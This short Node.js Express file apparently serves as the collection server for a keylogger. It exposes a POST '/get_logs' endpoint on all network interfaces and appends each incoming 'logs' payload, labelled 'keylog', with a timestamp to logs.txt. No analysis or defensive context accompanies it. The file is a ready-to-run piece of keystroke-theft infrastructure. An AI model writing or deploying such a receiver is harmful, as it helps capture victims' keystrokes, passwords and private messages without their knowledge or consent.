const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.json());

app.post('/get_logs', (req, res) => {
    const logs = req.body.logs;
    const logEntry = {
        timestamp: new Date().toISOString(),
        keylog: logs
    };
    
    const logEntryJSON = JSON.stringify(logEntry)+"\n";

    fs.appendFile('logs.txt', logEntryJSON, (err) => {
        if (err) {
            console.error('Error writing to log file', err);
            res.status(500).send({ result: false });
        } else {
            res.send({ result: true });
        }
    });
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://0.0.0.0:${PORT}`);
});